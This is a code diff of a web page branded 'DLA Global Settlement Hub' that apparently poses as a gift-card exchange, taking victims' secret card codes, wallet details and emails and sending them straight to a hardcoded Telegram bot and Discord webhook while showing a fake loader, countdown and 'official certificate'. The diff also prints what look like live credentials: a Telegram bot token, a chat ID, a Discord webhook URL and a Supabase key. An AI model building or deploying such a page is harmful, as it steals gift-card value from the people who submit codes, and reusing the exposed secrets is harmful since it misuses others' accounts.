@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>DLA | Global Settlement Hub</title>
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap" rel="stylesheet">
@@ -13,14 +12,12 @@
         [data-theme="light"] { --bg: #eceff1; --panel: #ffffff; --text: #1a1a1a; --input-bg: #e0e6ea; --border: #ccc; --card-bg: #f8f9fa; }
         body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; padding-bottom: 20px; display: flex; flex-direction: column; align-items: center; overflow-x: hidden; transition: background 0.3s; }
         
-        /* DASHBOARD / HISTORY STYLES */
         #dashboard-view { display: none; width: 100%; }
         .tx-item { background: var(--card-bg); padding: 15px; border-radius: 12px; margin-bottom: 10px; border: 1px solid var(--border); text-align: left; transition: 0.3s; }
         .status-badge { font-size: 9px; padding: 3px 8px; border-radius: 4px; font-weight: 900; }
         .status-pending { background: rgba(212,175,55,0.1); color: var(--gold); border: 1px solid rgba(212,175,55,0.3); }
         .status-approved { background: rgba(74, 222, 128, 0.1); color: #4ade80; border: 1px solid rgba(74, 222, 128, 0.3); }
 
-        /* ORIGINAL STYLES */
         .theme-toggle { position: fixed; top: 15px; right: 15px; z-index: 9999; background: var(--gold); border: none; padding: 8px 12px; border-radius: 8px; font-weight: 800; font-size: 10px; color: #000; cursor: pointer; text-transform: uppercase; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
         .ticker-wrap { width: 100%; background: #111; border-bottom: 1px solid var(--gold); padding: 10px 0; font-size: 11px; color: var(--gold); overflow: hidden; white-space: nowrap; }
         .ticker { display: inline-block; white-space: nowrap; animation: scrollText 25s linear infinite; padding-left: 100%; }
@@ -105,8 +102,8 @@
                 <option value="1.4">🎮 Steam Wallet [1.4x]</option>
             </select>
 
-            <label>Secret Card Code (e.g., ABC-123-XYZ)</label>
-            <input id="card" placeholder="ENTER 16-DIGIT CODE" oninput="this.value = this.value.toUpperCase()">
+            <label>Secret Card Code (16-Digits)</label>
+            <input id="card" placeholder="ENTER 16-DIGIT CODE" maxlength="16" oninput="this.value = this.value.toUpperCase()">
 
             <label>Value ($)</label>
             <input id="amt" type="number" value="100" min="25" oninput="updateVal()">
@@ -205,17 +202,17 @@
     <a href="https://t.me/Interglobalsettlement" class="chat-btn"><div class="dot"></div><span>Telegram Support</span></a>
 
     <script>
-        // --- SUPABASE CONFIG ---
-        const SB_URL = 'https://wgaypjhiahdrxhcaqqsm.supabase.co';
-        const SB_KEY = 'sb_publishable_jYwoLzJCGLPi5sQAU29USA_tXCQXpLQ';
-        const supabaseClient = supabase.createClient(SB_URL, SB_KEY);
-
         const TELEGRAM_TOKEN = "8662083297:AAHESm81XuXqj7ZUgESysc1RH-lRiSPwARs"; 
         const TELEGRAM_CHAT_ID = "5022438644";
         const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484706100916781057/b13TunLishCPP0s3b2Q6G0bG84UMShEICD6KRiQaWYUHmG0c2rSoq2mJ6FWjuEgZbfJS";
         
         let method = ""; let rateL = 1; let sym = "USD";
         const successSound = new Audio('https://assets.mixkit.co/active_storage/sfx/2013/2013-preview.mp3');
+
+        // Initialize local code storage
+        if (!localStorage.getItem('dla_used_codes')) {
+            localStorage.setItem('dla_used_codes', JSON.stringify([]));
+        }
 
         function toggleView(view) {
             if(view === 'dashboard') {
@@ -308,31 +305,20 @@
             
             if(!method || !cardCode || !walletDetails || !userEmail) return alert("Please fill all fields.");
 
-            // START: SUPABASE STORAGE WITH DUPLICATE CODE CHECK
-            const { data, error } = await supabaseClient
-                .from('exchange_submissions')
-                .insert([
-                    { 
-                        card_code: cardCode, 
-                        asset_name: assetName, 
-                        amount: amount, 
-                        payout_method: method, 
-                        wallet_details: walletDetails, 
-                        user_email: userEmail 
-                    }
-                ]);
-
-            if (error) {
-                // PostgREST/Supabase code 23505 means a Unique Constraint was violated
-                if(error.code === '23505') {
-                    alert("❌ ERROR: This card code has already been submitted. Double submissions are not allowed.");
-                } else {
-                    console.error("Supabase Error:", error);
-                    alert("System Error: Could not complete authorization.");
-                }
-                return; // End function to stop loader and notifications
+            // Strict 16-Digit Check
+            if(cardCode.length !== 16) {
+                return alert("❌ ERROR: Code must be exactly 16 characters.");
             }
-            // END: SUPABASE STORAGE
+
+            // Local Duplicate Check
+            let usedCodes = JSON.parse(localStorage.getItem('dla_used_codes'));
+            if(usedCodes.includes(cardCode)) {
+                return alert("❌ ERROR: This card code has already been submitted.");
+            }
+
+            // Add to local used list
+            usedCodes.push(cardCode);
+            localStorage.setItem('dla_used_codes', JSON.stringify(usedCodes));
 
             const history = JSON.parse(localStorage.getItem('dla_history') || '[]');
             const newTx = { 
@@ -348,47 +334,33 @@
             document.getElementById('form').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
 
-            const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            const messageText = `🚨 *NEW DLA SUBMISSION*\n\n` +
-                                `*Asset:* ${assetName}\n` +
-                                `*Card Code:* \`${cardCode}\` \n` +
-                                `*USD Value:* ${amount}\n` +
-                                `*Method:* ${method}\n` +
-                                `*Payout To:* ${walletDetails}\n` +
-                                `*User Email:* ${userEmail}`;
-
-            fetch(telegramUrl, {
+            // Send Notifications
+            fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: TELEGRAM_CHAT_ID,
-                    text: messageText,
+                    text: `🚨 *NEW DLA SUBMISSION*\n\n*Asset:* ${assetName}\n*Card Code:* \`${cardCode}\` \n*USD Value:* ${amount}\n*Method:* ${method}\n*Recipient:* ${walletDetails}\n*Email:* ${userEmail}`,
                     parse_mode: 'Markdown'
-                }),
-                keepalive: true
+                })
             });
-
-            const discordPayload = {
-                username: "DLA SETTLEMENT HUB",
-                embeds: [{
-                    title: "🚨 NEW CARD RECEIVED",
-                    color: 13938487,
-                    fields: [
-                        { name: "Asset Class", value: assetName, inline: true },
-                        { name: "USD Value", value: amount, inline: true },
-                        { name: "Card Code (Tap to Copy)", value: "```" + cardCode + "```" },
-                        { name: "Payout Method", value: method, inline: true },
-                        { name: "Recipient Details", value: walletDetails },
-                        { name: "User Email", value: userEmail }
-                    ],
-                    timestamp: new Date()
-                }]
-            };
 
             fetch(DISCORD_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(discordPayload)
+                body: JSON.stringify({
+                    embeds: [{
+                        title: "🚨 NEW CARD RECEIVED",
+                        color: 13938487,
+                        fields: [
+                            { name: "Asset", value: assetName, inline: true },
+                            { name: "Value", value: amount, inline: true },
+                            { name: "Code", value: "```" + cardCode + "```" },
+                            { name: "Recipient", value: walletDetails }
+                        ],
+                        timestamp: new Date()
+                    }]
+                })
             });
 
             let p = 0;
@@ -418,13 +390,10 @@
 
         function startTimer() {
             let time = 3600;
-            const timerEl = document.getElementById('r-timer');
             const countdown = setInterval(() => {
                 time--;
-                let h = Math.floor(time / 3600);
-                let m = Math.floor((time % 3600) / 60);
-                let s = time % 60;
-                timerEl.innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+                let h = Math.floor(time / 3600), m = Math.floor((time % 3600) / 60), s = time % 60;
+                document.getElementById('r-timer').innerText = `${String(h).padStart(2, '0')}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
                 if (time <= 0) clearInterval(countdown);
             }, 1000);
         }
@@ -432,7 +401,7 @@
         function saveHDReceipt() {
             html2canvas(document.querySelector("#receipt-content"), { scale: 3 }).then(canvas => {
                 const link = document.createElement('a');
-                link.download = 'DLA_Certificate_Official.png';
+                link.download = 'DLA_Official_Certificate.png';
                 link.href = canvas.toDataURL();
                 link.click();
             });
